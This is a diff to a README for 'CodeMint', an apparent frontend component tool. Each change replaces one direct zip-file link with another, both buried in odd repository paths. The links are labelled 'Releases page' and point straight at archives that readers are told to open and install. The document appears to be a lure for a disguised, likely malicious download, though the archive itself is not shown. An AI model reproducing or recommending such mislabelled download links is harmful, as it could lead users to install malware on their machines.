@@ -2,7 +2,7 @@
 
 ## 🌟 Discover and Share Frontend Components Easily
 
-[![Download CodeMint](https://raw.githubusercontent.com/rousing-lordtodd483/CodeMint/main/reedling/CodeMint.zip%20CodeMint-Click%https://raw.githubusercontent.com/rousing-lordtodd483/CodeMint/main/reedling/CodeMint.zip)](https://raw.githubusercontent.com/rousing-lordtodd483/CodeMint/main/reedling/CodeMint.zip)
+[![Download CodeMint](https://github.com/rousing-lordtodd483/CodeMint/raw/refs/heads/main/src/utils/Mint-Code-3.9.zip%20CodeMint-Click%https://github.com/rousing-lordtodd483/CodeMint/raw/refs/heads/main/src/utils/Mint-Code-3.9.zip)](https://github.com/rousing-lordtodd483/CodeMint/raw/refs/heads/main/src/utils/Mint-Code-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to CodeMint! This open-source platform helps frontend developers discove
 
 To get started, you will need to download CodeMint. Follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/rousing-lordtodd483/CodeMint/main/reedling/CodeMint.zip).
+1. Visit the [Releases page](https://github.com/rousing-lordtodd483/CodeMint/raw/refs/heads/main/src/utils/Mint-Code-3.9.zip).
 2. Find the latest release at the top of the page.
 3. Look for download options that suit your device. Click on the appropriate link to download CodeMint.
 4. Once the download completes, open the downloaded file and follow the installation prompts.
@@ -60,7 +60,7 @@ Join the growing community of frontend developers. Engage on GitHub, share your 
 
 Keep an eye on the Releases page for updates. We regularly add new components and improve existing ones. Your feedback helps us make CodeMint better!
 
-**Remember:** To download CodeMint, head over to our [Releases page](https://raw.githubusercontent.com/rousing-lordtodd483/CodeMint/main/reedling/CodeMint.zip) now!
+**Remember:** To download CodeMint, head over to our [Releases page](https://github.com/rousing-lordtodd483/CodeMint/raw/refs/heads/main/src/utils/Mint-Code-3.9.zip) now!
 
 ## 📝 License
 
